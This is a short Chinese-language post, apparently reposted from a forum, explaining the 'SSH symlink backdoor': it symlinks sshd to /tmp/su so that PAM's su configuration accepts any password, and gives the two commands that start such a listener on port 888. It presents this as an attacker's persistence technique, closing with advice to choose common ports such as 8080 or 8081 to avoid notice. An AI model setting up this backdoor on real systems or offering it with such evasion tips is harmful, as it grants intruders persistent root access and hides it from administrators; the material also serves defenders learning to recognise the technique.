# SSH 软连接后门

> 原文：[https://www.zhihuifly.com/t/topic/3486](https://www.zhihuifly.com/t/topic/3486)

# SSH 软连接后门

软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息（su），然而su在pam_rootok只检测uid 0即可认证成功，这样就导致了可以使用任意密码登录。

```
ln -sf /usr/sbin/sshd /tmp/su
/tmp/su -oPort=888 
```

![image](img/bfef694471a2b8c7012305bc6792054c.png)

优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。